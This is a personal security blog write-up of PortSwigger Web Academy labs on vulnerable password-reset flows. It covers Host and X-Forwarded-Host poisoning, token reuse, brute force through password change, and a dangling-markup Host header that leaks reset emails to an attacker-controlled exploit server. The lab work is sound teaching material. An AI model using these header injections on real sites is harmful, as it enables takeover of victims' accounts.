<!DOCTYPE html><html lang="en" ><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no"><meta name="day-prompt" content="days ago"><meta name="hour-prompt" content="hours ago"><meta name="minute-prompt" content="minutes ago"><meta name="justnow-prompt" content="just now"><meta name="generator" content="Jekyll v4.2.1" /><meta property="og:title" content="Vulnerable Password Reset" /><meta name="author" content="eng4ge" /><meta property="og:locale" content="en" /><meta name="description" content="Intro This post/writeup is all about the Authentication vulnerabilities or Broken Authentication if we follow OWASP naming scheme." /><meta property="og:description" content="Intro This post/writeup is all about the Authentication vulnerabilities or Broken Authentication if we follow OWASP naming scheme." /><link rel="canonical" href="https://an9k0r.github.io/posts/Vulnerable_password_reset/" /><meta property="og:url" content="https://an9k0r.github.io/posts/Vulnerable_password_reset/" /><meta property="og:site_name" content="CyberSec-Research.Space" /><meta property="og:type" content="article" /><meta property="article:published_time" content="2022-09-30T09:00:00+02:00" /><meta name="twitter:card" content="summary" /><meta property="twitter:title" content="Vulnerable Password Reset" /><meta name="twitter:site" content="@cybersec_space" /><meta name="twitter:creator" content="@eng4ge" /><meta name="google-site-verification" content="google_meta_tag_verification" /> <script type="application/ld+json"> {"author":{"@type":"Person","name":"eng4ge"},"description":"Intro This post/writeup is all about the Authentication vulnerabilities or Broken Authentication if we follow OWASP naming scheme.","headline":"Vulnerable Password Reset","dateModified":"2022-10-11T15:35:20+02:00","url":"https://an9k0r.github.io/posts/Vulnerable_password_reset/","datePublished":"2022-09-30T09:00:00+02:00","@type":"BlogPosting","mainEntityOfPage":{"@type":"WebPage","@id":"https://an9k0r.github.io/posts/Vulnerable_password_reset/"},"@context":"https://schema.org"}</script><title>Vulnerable Password Reset | CyberSec-Research.Space</title><link rel="apple-touch-icon" sizes="180x180" href="/assets/img/favicons/apple-touch-icon.png"><link rel="icon" type="image/png" sizes="32x32" href="/assets/img/favicons/favicon-32x32.png"><link rel="icon" type="image/png" sizes="16x16" href="/assets/img/favicons/favicon-16x16.png"><link rel="manifest" href="/assets/img/favicons/site.webmanifest"><link rel="shortcut icon" href="/assets/img/favicons/favicon.ico"><meta name="apple-mobile-web-app-title" content="CyberSec-Research.Space"><meta name="application-name" content="CyberSec-Research.Space"><meta name="msapplication-TileColor" content="#da532c"><meta name="msapplication-config" content="/assets/img/favicons/browserconfig.xml"><meta name="theme-color" content="#ffffff"><link rel="preconnect" href="https://fonts.gstatic.com" crossorigin="anonymous"><link rel="dns-prefetch" href="https://fonts.gstatic.com"><link rel="preconnect" href="https://cdn.jsdelivr.net"><link rel="dns-prefetch" href="https://cdn.jsdelivr.net"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4.0.0/dist/css/bootstrap.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5.11.2/css/all.min.css"><link rel="stylesheet" href="/assets/css/style.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/afeld/bootstrap-toc@1.0.1/dist/bootstrap-toc.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/magnific-popup@1.1.0/dist/magnific-popup.min.css"> <script src="https://cdn.jsdelivr.net/npm/jquery@3/dist/jquery.min.js"></script> <script type="text/javascript"> class ModeToggle { static get MODE_KEY() { return "mode"; } static get DARK_MODE() { return "dark"; } static get LIGHT_MODE() { return "light"; } static get ID() { return "mode-toggle"; } constructor() { if (this.hasMode) { if (this.isDarkMode) { if (!this.isSysDarkPrefer) { this.setDark(); } } else { if (this.isSysDarkPrefer) { this.setLight(); } } } let self = this; /* always follow the system prefers */ this.sysDarkPrefers.addEventListener("change", () => { if (self.hasMode) { if (self.isDarkMode) { if (!self.isSysDarkPrefer) { self.setDark(); } } else { if (self.isSysDarkPrefer) { self.setLight(); } } self.clearMode(); } self.notify(); }); } /* constructor() */ get sysDarkPrefers() { return window.matchMedia("(prefers-color-scheme: dark)"); } get isSysDarkPrefer() { return this.sysDarkPrefers.matches; } get isDarkMode() { return this.mode === ModeToggle.DARK_MODE; } get isLightMode() { return this.mode === ModeToggle.LIGHT_MODE; } get hasMode() { return this.mode != null; } get mode() { return sessionStorage.getItem(ModeToggle.MODE_KEY); } /* get the current mode on screen */ get modeStatus() { if (this.isDarkMode || (!this.hasMode && this.isSysDarkPrefer)) { return ModeToggle.DARK_MODE; } else { return ModeToggle.LIGHT_MODE; } } setDark() { $('html').attr(ModeToggle.MODE_KEY, ModeToggle.DARK_MODE); sessionStorage.setItem(ModeToggle.MODE_KEY, ModeToggle.DARK_MODE); } setLight() { $('html').attr(ModeToggle.MODE_KEY, ModeToggle.LIGHT_MODE); sessionStorage.setItem(ModeToggle.MODE_KEY, ModeToggle.LIGHT_MODE); } clearMode() { $('html').removeAttr(ModeToggle.MODE_KEY); sessionStorage.removeItem(ModeToggle.MODE_KEY); } /* Notify another plugins that the theme mode has changed */ notify() { window.postMessage({ direction: ModeToggle.ID, message: this.modeStatus }, "*"); } } /* ModeToggle */ const toggle = new ModeToggle(); function flipMode() { if (toggle.hasMode) { if (toggle.isSysDarkPrefer) { if (toggle.isLightMode) { toggle.clearMode(); } else { toggle.setLight(); } } else { if (toggle.isDarkMode) { toggle.clearMode(); } else { toggle.setDark(); } } } else { if (toggle.isSysDarkPrefer) { toggle.setLight(); } else { toggle.setDark(); } } toggle.notify(); } /* flipMode() */ </script><body data-spy="scroll" data-target="#toc" topbar-visible="true"><div id="sidebar" class="d-flex flex-column align-items-end" lang="en"><div class="profile-wrapper text-center"><div id="avatar"> <a href="/" alt="avatar" class="mx-auto"> <img src="/assets/images/logo.jpeg" alt="avatar" onerror="this.style.display='none'"> </a></div><div class="site-title mt-3"> <a href="/">CyberSec-Research.Space</a></div><div class="site-subtitle font-italic">Information Security Personal Blog</div></div><ul class="w-100"><li class="nav-item"> <a href="/" class="nav-link"> <i class="fa-fw fas fa-home ml-xl-3 mr-xl-3 unloaded"></i> <span>HOME</span> </a><li class="nav-item"> <a href="/blogging/" class="nav-link"> <i class="fa-fw fas fa-book ml-xl-3 mr-xl-3 unloaded"></i> <span>BLOGS AND GUIDES</span> </a><li class="nav-item"> <a href="/hack_the_box/" class="nav-link"> <i class="fa-fw fas fa-bug ml-xl-3 mr-xl-3 unloaded"></i> <span>HACK THE BOX</span> </a><li class="nav-item"> <a href="/blue_team_ctf/" class="nav-link"> <i class="fa-fw fas fa-anchor ml-xl-3 mr-xl-3 unloaded"></i> <span>BLUE TEAM CTFS</span> </a><li class="nav-item"> <a href="/web_application/" class="nav-link"> <i class="fa-fw fas fa-terminal ml-xl-3 mr-xl-3 unloaded"></i> <span>WEB APPLICATION</span> </a><li class="nav-item"> <a href="/binary_exploitation/" class="nav-link"> <i class="fa-fw fas fa-microchip ml-xl-3 mr-xl-3 unloaded"></i> <span>BINARY EXPLOITATION</span> </a><li class="nav-item"> <a href="/categories/" class="nav-link"> <i class="fa-fw fas fa-stream ml-xl-3 mr-xl-3 unloaded"></i> <span>CATEGORIES</span> </a><li class="nav-item"> <a href="/tags/" class="nav-link"> <i class="fa-fw fas fa-tag ml-xl-3 mr-xl-3 unloaded"></i> <span>TAGS</span> </a><li class="nav-item"> <a href="/archives/" class="nav-link"> <i class="fa-fw fas fa-archive ml-xl-3 mr-xl-3 unloaded"></i> <span>ARCHIVES</span> </a><li class="nav-item"> <a href="/about/" class="nav-link"> <i class="fa-fw fas fa-info-circle ml-xl-3 mr-xl-3 unloaded"></i> <span>ABOUT</span> </a></ul><div class="sidebar-bottom mt-auto d-flex flex-wrap justify-content-center align-items-center"> <button class="mode-toggle btn" aria-label="Switch Mode"> <i class="fas fa-adjust"></i> </button> <span class="icon-border"></span> <a href="https://github.com/an9k0r" aria-label="github" target="_blank" rel="noopener"> <i class="fab fa-github"></i> </a> <a href="https://twitter.com/cybersec_space" aria-label="twitter" target="_blank" rel="noopener"> <i class="fab fa-twitter"></i> </a> <a href=" javascript:location.href = 'mailto:' + ['',''].join('@')" aria-label="email" > <i class="fas fa-envelope"></i> </a> <a href="/feed.xml" aria-label="rss" > <i class="fas fa-rss"></i> </a></div></div><div id="topbar-wrapper" class="row justify-content-center"><div id="topbar" class="col-11 d-flex h-100 align-items-center justify-content-between"> <span id="breadcrumb"> <span> <a href="/"> Home </a> </span> <span>Vulnerable Password Reset</span> </span> <i id="sidebar-trigger" class="fas fa-bars fa-fw"></i><div id="topbar-title"> Post</div><i id="search-trigger" class="fas fa-search fa-fw"></i> <span id="search-wrapper" class="align-items-center"> <i class="fas fa-search fa-fw"></i> <input class="form-control" id="search-input" type="search" aria-label="search" autocomplete="off" placeholder="Search..."> <i class="fa fa-times-circle fa-fw" id="search-cleaner"></i> </span> <span id="search-cancel" >Cancel</span></div></div><div id="main-wrapper"><div id="main"><div class="row"><div id="core-wrapper" class="col-12 col-lg-11 col-xl-8"><div class="post pl-1 pr-1 pl-sm-2 pr-sm-2 pl-md-4 pr-md-4"><h1 data-toc-skip>Vulnerable Password Reset</h1><div class="post-meta text-muted"><div> By <em> <a href="https://github.com/an9k0r">eng4ge</a> </em></div><div class="d-flex"><div> <span> Posted <em class="timeago" date="2022-09-30 09:00:00 +0200" data-toggle="tooltip" data-placement="bottom" title="Fri, Sep 30, 2022, 9:00 AM +0200" >Sep 30, 2022</em> </span> <span> Updated <em class="timeago" date="2022-10-11 15:35:20 +0200 " data-toggle="tooltip" data-placement="bottom" title="Tue, Oct 11, 2022, 3:35 PM +0200" >Oct 11, 2022</em> </span> <span class="readtime" data-toggle="tooltip" data-placement="bottom" title="1121 words"> <em>6 min</em> read</span></div></div></div><div class="post-content"><h1 id="intro">Intro</h1><p>This post/writeup is all about the Authentication vulnerabilities or <a href="https://owasp.org/www-project-top-ten/2017/A2_2017-Broken_Authentication">Broken Authentication</a> if we follow <a href="https://owasp.org/">OWASP</a> naming scheme.</p><p>I’ll be using primarily <a href="https://portswigger.net/web-security/authentication">Portswigger Web Academy</a> Labs, but i do intent do throw other labs and writeups here as well.</p><blockquote><p>This post is all about vulnerable password reset implementations which can bypass authentication completely or allow the attacker to bypass other security implementations</p></blockquote><h2 id="toc">TOC<a href="#toc" class="anchor"><i class="fas fa-hashtag"></i></a></h2></h2><ul><li><a href="#intro">Intro</a><ul><li><a href="#toc">TOC</a></ul><li><a href="#basic-password-reset-poisoning---host-header">Basic password reset poisoning - (Host Header)</a><ul><li><a href="#enumeration---password-reset">Enumeration - Password Reset</a><li><a href="#exploitation---password-account">Exploitation - Password Account</a></ul><li><a href="#password-reset-broken-logic">Password reset broken logic</a><ul><li><a href="#enumerating-password-reset-mechanismus">Enumerating Password Reset mechanismus</a><li><a href="#exploiting-password-reset-mechanismus">Exploiting Password Reset Mechanismus</a></ul><li><a href="#password-reset-poisoning-via-middleware---x-forwarded-for-header">Password reset poisoning via middleware - (X-Forwarded-For Header)</a><ul><li><a href="#finding-and-exploiting-the-vulnerability">Finding and exploiting the vulnerability</a></ul><li><a href="#password-brute-force-via-password-change">Password brute-force via password change</a><ul><li><a href="#brute-force-via-password-change-exploitation">Brute-Force via password change exploitation</a></ul><li><a href="#password-reset-poisoning-via-dangling-markup">Password reset poisoning via dangling markup</a><ul><li><a href="#enumeration">Enumeration</a><li><a href="#exploitation">Exploitation</a></ul></ul><h1 id="basic-password-reset-poisoning---host-header">Basic password reset poisoning - (Host Header)</h1><blockquote><p>This lab is vulnerable to password reset poisoning. The user carlos will carelessly click on any links in emails that he receives. To solve the lab, log in to Carlos’s account.</p><p>You can log in to your own account using the following credentials: wiener:peter. Any emails sent to this account can be read via the email client on the exploit server.</p></blockquote><h2 id="enumeration---password-reset">Enumeration - Password Reset<a href="#enumeration---password-reset" class="anchor"><i class="fas fa-hashtag"></i></a></h2></h2><p>Password Reset functionality on the front-end is just like any other:</p><p><img data-src="/assets/images/d4cf46a61461f4a2851e74c87fefdb75ad9786ff445cffb71648f3403ec1e119.png" alt="picture 129" data-proofer-ignore></p><p>In the request we can notice CSRF token and that we can request it for any user basically, but that is by itself not an issue, as email should be sent to users account.</p><p><img data-src="/assets/images/abfb7211927e3ee1cc113082efc48fe42fbbaf0c79591170ff4b5dacfb5f8e40.png" alt="picture 128" data-proofer-ignore></p><h2 id="exploitation---password-account">Exploitation - Password Account<a href="#exploitation---password-account" class="anchor"><i class="fas fa-hashtag"></i></a></h2></h2><p>If we however change the <code class="language-plaintext highlighter-rouge">Host</code> HTTP Header to our own <code class="language-plaintext highlighter-rouge">Exploit Server</code>: <code class="language-plaintext highlighter-rouge">exploit-0ab000a60403a23bc0663c42014a00e6.web-security-academy.net/exploit</code>, then Email would still be sent:</p><p><img data-src="/assets/images/2497d3f84cb6c2e586ea8f236872d557a5fbf013627b9e6f8f0661dc74c681d9.png" alt="picture 130" data-proofer-ignore></p><p>And if we check the logs, we can find the request with the token code right there in the middle:</p><p><img data-src="/assets/images/f5e1537c2942adfbe26759d8b61045b10dde6d9cc08bdbf9949a9771ec1eb5ed.png" alt="picture 131" data-proofer-ignore></p><p>If i now open the link <code class="language-plaintext highlighter-rouge">https://0a110040049ca2b2c06b3c6d0058002b.web-security-academy.net/forgot-password?temp-forgot-password-token=bsWHQe5G70EQyDdmK29IbyvrK4SxZ1Cm</code> i can set password for <code class="language-plaintext highlighter-rouge">carlos</code>.</p><p><img data-src="/assets/images/ccad07b77f6f399f518287ef57d920f95549dba82cc35bb29a739489c83a7509.png" alt="picture 132" data-proofer-ignore></p><p>Lab has been solved:</p><p><img data-src="/assets/images/ab019d17bf151588c3000474c821681c708ade52c901f990066838b21f27b6ad.png" alt="picture 133" data-proofer-ignore></p><h1 id="password-reset-broken-logic">Password reset broken logic</h1><blockquote><p>This lab’s password reset functionality is vulnerable. To solve the lab, reset Carlos’s password then log in and access his “My account” page.</p><p>Your credentials: wiener:peter</p><p>Victim’s username: carlos</p></blockquote><h2 id="enumerating-password-reset-mechanismus">Enumerating Password Reset mechanismus<a href="#enumerating-password-reset-mechanismus" class="anchor"><i class="fas fa-hashtag"></i></a></h2></h2><p>First of all let’s just reset password for <code class="language-plaintext highlighter-rouge">wiener</code>. For this we need an email address which is provided by the Lab</p><p><img data-src="/assets/images/74cc1fff4d9689df248918f0a168532fa53b4a418173f7f053fa81b6a7b3fbb6.png" alt="picture 103" data-proofer-ignore></p><p>In <code class="language-plaintext highlighter-rouge">password-reset</code> we can either enter username or email. Let’s go for an username:</p><p><img data-src="/assets/images/9e8794ce13750b39f41d1b8e50f707dd0baafcd67ac40a04689280571b0893f9.png" alt="picture 104" data-proofer-ignore></p><p>Email comes with a reset link:</p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>https://0ac0003d04636429c0420e00000f00c7.web-security-academy.net/forgot-password?temp-forgot-password-token=6MusLEc8VCPVmUsE3mEMxZ3dRDm9q4VL
</pre></table></code></div></div><p>If i ask for another <code class="language-plaintext highlighter-rouge">password-reset</code> token, it changes</p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>https://0ac0003d04636429c0420e00000f00c7.web-security-academy.net/forgot-password?temp-forgot-password-token=FcIwW5uTrJCBE9IUbYymI84dYN3SeOsN
</pre></table></code></div></div><p>If we click on it, we get to the page to enter a new password.</p><p>If we enter a new password, this is a request that is issued to a backend</p><p><img data-src="/assets/images/549e5a26b2babca18b0850fbc62a80cba1a6d6817b047191d3c6e17614c52ab3.png" alt="picture 105" data-proofer-ignore></p><p>The question now arises, can we swap the username with <code class="language-plaintext highlighter-rouge">carlos</code> using token that was issued for <code class="language-plaintext highlighter-rouge">wiener</code>?</p><h2 id="exploiting-password-reset-mechanismus">Exploiting Password Reset Mechanismus<a href="#exploiting-password-reset-mechanismus" class="anchor"><i class="fas fa-hashtag"></i></a></h2></h2><p>If we simply reuse the previous token that was sent to <code class="language-plaintext highlighter-rouge">wiener</code> and swap the user with <code class="language-plaintext highlighter-rouge">carlos</code>, it appears that it’s actually working</p><p><img data-src="/assets/images/d6db66f52317a07f5f2e7217995cc09f8489d86f2067157d2f2c379a42f45a47.png" alt="picture 106" data-proofer-ignore></p><p>We can login now with <code class="language-plaintext highlighter-rouge">carlos:peter</code></p><p><img data-src="/assets/images/970b338af0d5eb1d11f08d5486f6e76608fdbe5a5ba49e535e9224c092fabf62.png" alt="picture 107" data-proofer-ignore></p><p>Token should only be used once and by any means, it should not work for other users that have not requested it.</p><h1 id="password-reset-poisoning-via-middleware---x-forwarded-for-header">Password reset poisoning via middleware - (X-Forwarded-For Header)</h1><blockquote><p>This lab is vulnerable to password reset poisoning. The user carlos will carelessly click on any links in emails that he receives. To solve the lab, log in to Carlos’s account. You can log in to your own account using the following credentials: wiener:peter. Any emails sent to this account can be read via the email client on the exploit server.</p></blockquote><h2 id="finding-and-exploiting-the-vulnerability">Finding and exploiting the vulnerability<a href="#finding-and-exploiting-the-vulnerability" class="anchor"><i class="fas fa-hashtag"></i></a></h2></h2><p>If we ask for password we get same looking link as in previous lab:</p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>https://0adc000d03b93ab9c019658300c800ce.web-security-academy.net/forgot-password?temp-forgot-password-token=Jdno4Z4KTNZHn7cLI1nHytyLFtrGp2Ha
</pre></table></code></div></div><p>And request does not ask us for a username</p><p><img data-src="/assets/images/8621fadbfe0dc621aa9dd3c1451e58d0e67f938b0bdf24bf8e40372a72a13084.png" alt="picture 108" data-proofer-ignore></p><p>Problem here is actually in middleware and this lab is all about that. If we enter <code class="language-plaintext highlighter-rouge">X-Forwarded-Host</code> header, the link sent will actually get tampered with and swapped with our own host. Let’s verify that:</p><p><img data-src="/assets/images/590e488b52c95c653c786e55a3831a465f109fa75852efd38ecfba557014879d.png" alt="picture 109" data-proofer-ignore></p><p>And checking the access log on our exploit server, we can see that request is there:</p><p><img data-src="/assets/images/590e488b52c95c653c786e55a3831a465f109fa75852efd38ecfba557014879d.png" alt="picture 110" data-proofer-ignore></p><p>We can change the password if we follow the link</p><p><img data-src="/assets/images/7aadb50e4503d024fe045e1ecec1014cfba1ff7f508c4da37486fa02c409889e.png" alt="picture 112" data-proofer-ignore></p><p>… and login using same password:</p><p><img data-src="/assets/images/408846fc4e5a6ca8cf2ef6631b417cd3188d859571f38a638f3b3d97802d8e63.png" alt="picture 113" data-proofer-ignore></p><p>More on that topic can be found at <a href="https://portswigger.net/web-security/host-header/exploiting/password-reset-poisoning">Portswigger Reset Password</a>. It all comes down, how the web application crates the token and what its security measures are. As always, it’s always dangerous to use user generated input.</p><h1 id="password-brute-force-via-password-change">Password brute-force via password change</h1><blockquote><p>This lab’s password change functionality makes it vulnerable to brute-force attacks. To solve the lab, use the list of candidate passwords to brute-force Carlos’s account and access his “My account” page.</p><p>Your credentials: wiener:peter</p><p>Victim’s username: carlos</p><p><a href="https://portswigger.net/web-security/authentication/auth-lab-passwords">Candidate passwords</a></p></blockquote><h2 id="brute-force-via-password-change-exploitation">Brute-Force via password change exploitation<a href="#brute-force-via-password-change-exploitation" class="anchor"><i class="fas fa-hashtag"></i></a></h2></h2><p>If we login, we have this form to update password:</p><p><img data-src="/assets/images/0cce991791d03a9ad6108ceb5bea7db3bb9de27a7fa15fed5d0066d5cab927b9.png" alt="picture 114" data-proofer-ignore></p><p>… and this is how request looks like in Burp:</p><p><img data-src="/assets/images/57da45be3b5aba2befa42bcbb7d5348bb03a44a48abba26fd709f31fba1222b4.png" alt="picture 115" data-proofer-ignore></p><blockquote><p>If we enter wrong password 2 times, account locks for 1 minute!</p><p>If we enter wrong password AND two different new passwords, we get another error message: <code class="language-plaintext highlighter-rouge">Current password is incorrect</code>!</p></blockquote><p><img data-src="/assets/images/a1d91068dd154ab5557baf07a0d26c0f4b8848a0f194b255297d64cb1b5223f9.png" alt="picture 117" data-proofer-ignore></p><p>Now let’s brute-force using intruder!</p><p><img data-src="/assets/images/bf48c713eaec25f91295d3fb7ff9400f2bffbc489841be581e473e6c2eca08d7.png" alt="picture 118" data-proofer-ignore></p><p>So get another response that <code class="language-plaintext highlighter-rouge">new password</code>s do not match, meaning we’ve found the <code class="language-plaintext highlighter-rouge">current password</code> = <code class="language-plaintext highlighter-rouge">jordan</code>.</p><p>Lab has been solved.</p><p><img data-src="/assets/images/093a63fafcc7ee1097567fd15d57c9eb73b688a15e1e9781f7b46d68f32ab305.png" alt="picture 119" data-proofer-ignore></p><h1 id="password-reset-poisoning-via-dangling-markup">Password reset poisoning via dangling markup</h1><blockquote><p>This lab is vulnerable to password reset poisoning via dangling markup. To solve the lab, log in to Carlos’s account.</p><p>You can log in to your own account using the following credentials: <code class="language-plaintext highlighter-rouge">wiener:peter</code>. Any emails sent to this account can be read via the email client on the exploit server.</p></blockquote><p>Reference: <a href="https://portswigger.net/web-security/cross-site-scripting/dangling-markup">Dangling markup injection</a></p><h2 id="enumeration">Enumeration<a href="#enumeration" class="anchor"><i class="fas fa-hashtag"></i></a></h2></h2><p>When we reset a password for our <code class="language-plaintext highlighter-rouge">wiener</code> user, we’d get an Email looking like this</p><p><img data-src="/assets/images/cd98389753754dba6d40956e720a013fc5f5d80ea391b4e24a13e165c28a676b.png" alt="picture 134" data-proofer-ignore></p><p>This is the raw Email found at <code class="language-plaintext highlighter-rouge">/email</code>, and there appears to be no sanitization.</p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
</pre><td class="rouge-code"><pre>Sent:     2022-10-04 10:54:27 +0000
From:     no-reply@0ac100e703e228b2c0f54f3d00170041.web-security-academy.net
To:       wiener@exploit-0a610053038828f2c0684ff0010e0010.web-security-academy.net
Subject:  Account recovery

&lt;p&gt;Hello!&lt;/p&gt;&lt;p&gt;Please &lt;a href='https://0ac100e703e228b2c0f54f3d00170041.web-security-academy.net/login'&gt;click here&lt;/a&gt; to login with your new password: bUzAvNKZqV&lt;/p&gt;&lt;p&gt;Thanks,&lt;br/&gt;Support team&lt;/p&gt;&lt;i&gt;This email has been scanned by the MacCarthy Email Security service&lt;/i&gt;
</pre></table></code></div></div><p>Another thing to note here is that we recieve a new password per email and not just Change password link!</p><p>The email above will also be our injection point for partially XSS. Idea of this <code class="language-plaintext highlighter-rouge">Dangling</code> attack is to poison HTML, like with XSS, by using tag like (img, a,…) pointing it to our controlled server and leaving the tag open (not closing Tags).</p><p>If we send Host with a header like this:</p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre><td class="rouge-code"><pre>POST /forgot-password HTTP/1.1
Host: 0a4c00770427c3cdc0b732ee006d00b7.web-security-academy.net:'&lt;a href="exploit-0a100050044cc386c015325d01860069.web-security-academy.net/?
</pre></table></code></div></div><h2 id="exploitation">Exploitation<a href="#exploitation" class="anchor"><i class="fas fa-hashtag"></i></a></h2></h2><p>If we do that and we know that <code class="language-plaintext highlighter-rouge">carlos</code> accesses the same Email client then we should now find the request in the <code class="language-plaintext highlighter-rouge">access logs</code>.</p><p><img data-src="/assets/images/cd6812fb9c69e5fcf919416f9be2c020bc8f3d00e0cbff6629b93bf85d3c0be6.png" alt="picture 136" data-proofer-ignore></p><p>So there we have two requests from different IP. One is for <code class="language-plaintext highlighter-rouge">wiener</code> and other one is for <code class="language-plaintext highlighter-rouge">carlos</code>.</p><p><img data-src="/assets/images/a5c74c2882d29ad4705fc43c5445940354b24b0ec317b579e9ed026d903cb61a.png" alt="picture 135" data-proofer-ignore></p><p>After ending this Lab, i wasn’t sure when this really would be exploitable. I’d say somewhere between finding XSS and not being able to leverage it, <code class="language-plaintext highlighter-rouge">Dangling</code> using HTTP Headers might be something to consider!</p></div><div class="post-tail-wrapper text-muted"><div class="post-meta mb-3"> <i class="far fa-folder-open fa-fw mr-1"></i> <a href='/categories/web-application/'>Web Application</a>, <a href='/categories/broken-authentication/'>Broken Authentication</a></div><div class="post-tags"> <i class="fa fa-tags fa-fw mr-1"></i> <a href="/tags/notes/" class="post-tag no-text-decoration" >Notes</a> <a href="/tags/web-application/" class="post-tag no-text-decoration" >Web Application</a> <a href="/tags/portswigger/" class="post-tag no-text-decoration" >Portswigger</a></div><div class="post-tail-bottom d-flex justify-content-between align-items-center mt-3 pt-5 pb-2"><div class="license-wrapper"> This post is licensed under <a href="https://creativecommons.org/licenses/by/4.0/"> CC BY 4.0 </a> by the author.</div><div class="share-wrapper"> <span class="share-label text-muted mr-1">Share</span> <span class="share-icons"> <a href="https://twitter.com/intent/tweet?text=Vulnerable Password Reset - CyberSec-Research.Space&url=https://an9k0r.github.io/posts/Vulnerable_password_reset/" data-toggle="tooltip" data-placement="top" title="Twitter" target="_blank" rel="noopener" aria-label="Twitter"> <i class="fa-fw fab fa-twitter"></i> </a> <a href="https://www.facebook.com/sharer/sharer.php?title=Vulnerable Password Reset - CyberSec-Research.Space&u=https://an9k0r.github.io/posts/Vulnerable_password_reset/" data-toggle="tooltip" data-placement="top" title="Facebook" target="_blank" rel="noopener" aria-label="Facebook"> <i class="fa-fw fab fa-facebook-square"></i> </a> <a href="https://telegram.me/share?text=Vulnerable Password Reset - CyberSec-Research.Space&url=https://an9k0r.github.io/posts/Vulnerable_password_reset/" data-toggle="tooltip" data-placement="top" title="Telegram" target="_blank" rel="noopener" aria-label="Telegram"> <i class="fa-fw fab fa-telegram"></i> </a> <i id="copy-link" class="fa-fw fas fa-link small" data-toggle="tooltip" data-placement="top" title="Copy link" title-succeed="Link copied successfully!"> </i> </span></div></div></div></div></div><div id="panel-wrapper" class="col-xl-3 pl-2 text-muted"><div class="access"><div id="access-lastmod" class="post"><div class="panel-heading">Recently Updated</div><ul class="post-content pl-0 pb-1 ml-1 mt-2"><li><a href="/posts/insecure_deserialization/">(Portswigger/WebAcademy) - Insecure Deserialization vulnerabilities</a><li><a href="/posts/ssti/">(Portswigger/WebAcademy) - Server-Side Template Injection vulnerabilities</a><li><a href="/posts/stored_XSS/">(Portswigger/WebAcademy) - Stored Cross-Site Scripting (XSS)</a><li><a href="/posts/Blind_SQL_Injection/">Blind SQL Injection</a><li><a href="/posts/OS_Command_Injection/">OS Command Injection</a></ul></div><div id="access-tags"><div class="panel-heading">Trending Tags</div><div class="d-flex flex-wrap mt-3 mb-1 mr-3"> <a class="post-tag" href="/tags/notes/">Notes</a> <a class="post-tag" href="/tags/portswigger/">Portswigger</a> <a class="post-tag" href="/tags/web-application/">Web Application</a> <a class="post-tag" href="/tags/linux/">Linux</a> <a class="post-tag" href="/tags/clear-text-credentials/">Clear Text Credentials</a> <a class="post-tag" href="/tags/password-reuse/">Password Reuse</a> <a class="post-tag" href="/tags/windows/">Windows</a> <a class="post-tag" href="/tags/deserialization/">Deserialization</a> <a class="post-tag" href="/tags/misconfiguration/">Misconfiguration</a> <a class="post-tag" href="/tags/password-cracking/">Password Cracking</a></div></div></div><script src="https://cdn.jsdelivr.net/gh/afeld/bootstrap-toc@1.0.1/dist/bootstrap-toc.min.js"></script><div id="toc-wrapper" class="pl-0 pr-4 mb-5"><div class="panel-heading pl-3 pt-2 mb-2">Contents</div><nav id="toc" data-toggle="toc"></nav></div></div></div><div class="row"><div class="col-12 col-lg-11 col-xl-8"><div id="tail-wrapper" class="pl-1 pr-1 pl-sm-2 pr-sm-2 pl-md-4 pr-md-4"><div id="related-posts" class="mt-5 mb-2 mb-sm-4"><h3 class="pt-2 mt-1 mb-4 ml-1" data-toc-skip>Further Reading</h3><div class="card-deck mb-4"><div class="card"> <a href="/posts/Alternative_vulnerable_authentication_mechanismus/"><div class="card-body"> <em class="timeago small" date="2022-09-30 09:00:00 +0200" >Sep 30, 2022</em><h3 class="pt-0 mt-1 mb-3" data-toc-skip>Other vulnerable Authentication Mechanismus</h3><div class="text-muted small"><p> Intro This post/writeup is all about the Authentication vulnerabilities or Broken Authentication if we follow OWASP naming scheme. I’ll be using primarily Portswigger Web Academy Labs, but i do in...</p></div></div></a></div><div class="card"> <a href="/posts/Multi_Factor_Authentication/"><div class="card-body"> <em class="timeago small" date="2022-09-30 09:00:00 +0200" >Sep 30, 2022</em><h3 class="pt-0 mt-1 mb-3" data-toc-skip>Multi-Factor Authentication (MFA)</h3><div class="text-muted small"><p> Intro This post/writeup is all about the Authentication vulnerabilities or Broken Authentication if we follow OWASP naming scheme. I’ll be using primarily Portswigger Web Academy Labs, but i do in...</p></div></div></a></div><div class="card"> <a href="/posts/Vulnerable_Username_and_Password_Authentication-copy/"><div class="card-body"> <em class="timeago small" date="2022-09-30 09:00:00 +0200" >Sep 30, 2022</em><h3 class="pt-0 mt-1 mb-3" data-toc-skip>Vulnerable Username-Password Authentication</h3><div 